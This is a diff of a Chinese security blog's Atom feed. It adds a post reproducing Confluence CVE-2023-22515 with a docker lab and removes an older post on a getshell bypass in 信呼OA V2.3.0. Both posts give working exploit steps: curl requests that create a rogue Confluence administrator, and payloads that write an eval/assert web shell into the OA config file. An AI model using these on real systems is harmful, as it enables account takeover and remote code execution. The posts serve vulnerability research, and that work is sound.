@@ -6,7 +6,7 @@
   <link href="http://jiushill.github.io/atom.xml" rel="self"/>
   
   <link href="http://jiushill.github.io/"/>
-  <updated>2023-08-08T22:02:38.678Z</updated>
+  <updated>2023-10-19T08:28:25.174Z</updated>
   <id>http://jiushill.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Confluence CVE-2023-22515漏洞复现</title>
+    <link href="http://jiushill.github.io/posts/395d58c0.html"/>
+    <id>http://jiushill.github.io/posts/395d58c0.html</id>
+    <published>2023-10-19T07:58:44.000Z</published>
+    <updated>2023-10-19T08:28:25.174Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzkxMzM3NjMxOQ==&amp;mid=2247483685&amp;idx=1&amp;sn=54b435180042beb9b709d1553bc3f5ab&amp;chksm=c17fd475f6085d634f1c529148f7f825400ffe899c51e181193e6bdf7cbd5d01c4697557104a&amp;mpshare=1&amp;scene=1&amp;srcid=1018qojPYalTqmkCEJMtpr6x&amp;sharer_shareinfo=600bda857d36789f7e9d9b21356b7250&amp;sharer_shareinfo_first=600bda857d36789f7e9d9b21356b7250#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzkxMzM3NjMxOQ==&amp;mid=2247483685&amp;idx=1&amp;sn=54b435180042beb9b709d1553bc3f5ab&amp;chksm=c17fd475f6085d634f1c529148f7f825400ffe899c51e181193e6bdf7cbd5d01c4697557104a&amp;mpshare=1&amp;scene=1&amp;srcid=1018qojPYalTqmkCEJMtpr6x&amp;sharer_shareinfo=600bda857d36789f7e9d9b21356b7250&amp;sharer_shareinfo_first=600bda857d36789f7e9d9b21356b7250#rd</a></p><p>影响版本：</p><pre><code>8.0.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.0.48.1.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.1.48.2.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.2.38.3.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.3.28.4.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.4.28.5.0 &lt;= Confluence Data Center and Confluence Server &lt;= 8.5.1</code></pre><p>Exploit</p><pre><code>curl http://127.0.0.1:8090/server-info.action\?bootstrapStatusProvider.applicationConfig.setupComplete\=false\;curl -X POST -H &quot;X-Atlassian-Token: no-check&quot; -d &quot;username=haxor&amp;fullName=leet&amp;email=leet@leet.com&amp;password=leet&amp;confirm=leet&amp;setup-next-button=Next&quot; http://127.0.0.1:8090/setup/setupadministrator.action\;curl -X POST -H &quot;X-Atlassian-Token: no-check&quot; http://127.0.0.1:8090/setup/finishsetup.action</code></pre><p>docker-compose.yml</p><pre><code>version: &#39;2&#39;services:  web:    image: vulhub/confluence:8.5.1    ports:      - &quot;8090:8090&quot;      - &quot;5050:5050&quot;    depends_on:      - db  db:    image: postgres:12.8-alpine    environment:    - POSTGRES_PASSWORD=postgres    - POSTGRES_DB=confluence</code></pre><p>先引用一张图<br><img src="https://z1.ax1x.com/2023/10/19/piiUSF1.png" alt=""></p><p>先定位到setupadministrator.action<br>com.atlassian.confluence_confluence-8.5.1/struts.xml<br><img src="https://z1.ax1x.com/2023/10/19/piiU9W6.png" alt=""></p><p>可以看到处理的class是com.atlassian.confluence.setup.actions.SetupAdministrator，先经过defaultSetupStack的拦截器</p><pre><code>&lt;action name=&quot;setupadministrator-start&quot; class=&quot;com.atlassian.confluence.setup.actions.SetupAdministrator&quot; method=&quot;doDefault&quot;&gt;    &lt;interceptor-ref name=&quot;defaultSetupStack&quot;/&gt;    &lt;result name=&quot;input&quot; type=&quot;velocity&quot;&gt;/setup/setupadministrator.vm&lt;/result&gt;    &lt;result name=&quot;error&quot; type=&quot;velocity&quot;&gt;/setup/setupadministrator.vm&lt;/result&gt;&lt;/action&gt;&lt;action name=&quot;setupadministrator&quot; class=&quot;com.atlassian.confluence.setup.actions.SetupAdministrator&quot;&gt;    &lt;result name=&quot;input&quot; type=&quot;velocity&quot;&gt;/setup/setupadministrator.vm&lt;/result&gt;    &lt;result name=&quot;error&quot; type=&quot;velocity&quot;&gt;/setup/setupadministrator.vm&lt;/result&gt;    &lt;result name=&quot;success&quot; type=&quot;redirect&quot;&gt;finishsetup.action&lt;/result&gt;    &lt;result name=&quot;custom-setup&quot; type=&quot;redirect&quot;&gt;finishsetup.action&lt;/result&gt;    &lt;result name=&quot;quick-setup&quot; type=&quot;redirect&quot;&gt;finishsetup.action&lt;/result&gt;&lt;/action&gt;</code></pre><p>defaultSetupStack拦截器里有一个setupcheck检测</p><pre><code>            &lt;interceptor-stack name=&quot;setupStack&quot;&gt;                &lt;interceptor-ref name=&quot;setup&quot;/&gt;            &lt;/interceptor-stack&gt;&lt;interceptor-stack name=&quot;defaultSetupStack&quot;&gt;                &lt;interceptor-ref name=&quot;setupStack&quot;/&gt;                &lt;interceptor-ref name=&quot;defaultStack&quot;/&gt;            &lt;/interceptor-stack&gt;</code></pre><p><img src="https://z1.ax1x.com/2023/10/19/piiUFyD.png" alt=""></p><p>经过动态调试大概逻辑是</p><pre><code>第一次执行return BootstrapUtils.getBootstrapManager().isSetupComplete() &amp;&amp; ContainerManager.isContainerSetup() ? &quot;alreadysetup&quot; : actionInvocation.invoke(); -&gt; Fasle-&gt;actionInvocation.invoke();第二次执行两边的isSetupComplete都返回true。由于返回是true所以是返回alreadysetup</code></pre><p>BootstrapUtils.getBootstrapManager().isSetupComplete()会返回setupComplete的值，如果是已经安装则返回true<br><img src="https://z1.ax1x.com/2023/10/19/piiUtkn.png" alt=""></p><p><img src="https://z1.ax1x.com/2023/10/19/piiUNYq.png" alt=""></p><p>而第一次ContainerManager.isContainerSetup()不存在则返回false<br><img src="https://z1.ax1x.com/2023/10/19/piiUUf0.png" alt=""></p><p>一真一假返回假，走到actionInvocation.invoke();，在com/opensymphony/xwork2/DefaultActionInvocation.class第203行会再次执行SetupCheckInterceptor.intercept。由于第二次两边都是true所以返回alreadysetup字符串<br><img src="https://z1.ax1x.com/2023/10/19/piiUdpV.png" alt=""></p><p><img src="https://z1.ax1x.com/2023/10/19/piiUwlT.png" alt=""></p><p>最后ResultCode是alreadysetup，检测为已经安装<br><img src="https://i.imgur.com/6R0t7NX.png" alt=""><br><img src="https://i.imgur.com/kNcDCsE.png" alt=""><br><img src="https://i.imgur.com/v562yNg.png" alt=""></p><p>该漏洞将bootstrapStatusProvider.applicationConfig.setupComplete设置为false。在这里将不会返回alreadysetup，也就是说我们在设置了setupComplete属性为false后；在下一次访问/setup/*目录下触发setupComplete拦截器前将一直有效</p><p>最后漏洞点是出现在，重写拦截器的点上</p><pre><code>&lt;interceptor name=&quot;params&quot; class=&quot;com.atlassian.xwork.interceptors.SafeParametersInterceptor&quot;/&gt;</code></pre><p><img src="https://i.imgur.com/vOYE4IW.png" alt=""></p><p>当请求的payload经过isSafeParameterName的匹配，最后会去到stack.setValue()<br><img src="https://i.imgur.com/FTinbUZ.png" alt=""></p><p><img src="https://i.imgur.com/NqXWFHW.png" alt=""></p><p>（然而我动态调试就是断不到这），那你问我，我怎么知道在地方是漏洞点，他钩子就这一个地方能控制不是这也没    别的了（<br>这里还需要设置一手X-Atlassian-Token: no-check的原因还是拦截器有检测，</p><pre><code>&lt;interceptor name=&quot;xsrfToken&quot; class=&quot;com.atlassian.confluence.xwork.ConfluenceXsrfTokenInterceptor&quot;/&gt;&lt;interceptor-ref name=&quot;xsrfToken&quot;/&gt;</code></pre><p><img src="https://i.imgur.com/RqnV2rZ.png" alt=""><br><img src="https://i.imgur.com/5OmIlWZ.png" alt=""><br><img src="https://i.imgur.com/rOK21jE.png" alt=""></p><p>Exploit<br><img src="https://i.imgur.com/1IwvgSo.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接：&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzkxMzM3NjMxOQ==&amp;amp;mi</summary>
+      
+    
+    
+    
+    
+    <category term="java代码审计" scheme="http://jiushill.github.io/tags/java代码审计/"/>
+    
+  </entry>
   
   <entry>
     <title>Steam上的黑产哥钓鱼手法</title>
@@ -435,28 +457,6 @@
     
     
     
-    
-  </entry>
-  
-  <entry>
-    <title>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</title>
-    <link href="http://jiushill.github.io/posts/3541f020.html"/>
-    <id>http://jiushill.github.io/posts/3541f020.html</id>
-    <published>2021-10-18T13:56:13.000Z</published>
-    <updated>2021-10-18T14:09:23.686Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://www.freebuf.com/articles/web/286380.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/286380.html</a><br>最近打点的时候遇见个信呼OA，用的上述的<code>后台配置文件getshell</code>方法成过getshell<br>原本打算复现一下的，后面一看版本最新的。。。<br>(后面重新看了一下，发现修复不严谨。在后台用户重命名处修改即可重新利用)<br><img src="https://z3.ax1x.com/2021/10/18/5a8IFH.png" alt=""></p><h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>在V2.2.8的时候报出一处update拼接管理员名的注入+配置文件插入管理员修改config文件的信息<br>之前的payload利用：</p><pre><code>http://127.0.0.1/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=true&amp;style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2Fhttp://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961a:函数名称m:类名称d:处理文件文件夹父路径名称</code></pre><p>路由分析<br><img src="https://z3.ax1x.com/2021/10/18/5aGa9A.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aGrB8.png" alt=""></p><p>以前的漏洞点分析:<br>gerenClassAction函数更新管理员信息的点<br><img src="https://z3.ax1x.com/2021/10/18/5aGghj.png" alt=""></p><p>在V2.3.0后，int强转只取第一个参数的值<br>（一开始没看仔细还以为那里做了过滤，后面更了post也没发现那里不对。最好才看见这个int）<br><img src="https://z3.ax1x.com/2021/10/18/5aGHN4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ9ED.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJeDf.png" alt=""></p><p>但是saveCongAjax函数没任何变化<br><img src="https://z3.ax1x.com/2021/10/18/5aJlCj.png" alt=""></p><p>直接利用后台的用户改名功能重命名管理员的名称，在rockClass.php新建了函数过滤，eval被砍了。直接用assert代替即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJUVU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ0PJ.png" alt=""></p><h2 id="死灰复燃"><a href="#死灰复燃" class="headerlink" title="死灰复燃"></a>死灰复燃</h2><p>用户管理处修改当前登录管理的姓名为:<code>\rassert($_POST[1]);//</code><br><img src="https://z3.ax1x.com/2021/10/18/5aJIxI.png" alt=""></p><p>访问<a href="http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961</a> 即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJOIg.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aYiZT.png" alt=""></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接：&lt;a href=&quot;https://www.freebuf.com/articles/web/286380.html&quot; target</summary>
-      
-    
-    
-    
-    
-    <category term="Writing" scheme="http://jiushill.github.io/tags/Writing/"/>
     
   </entry>
   
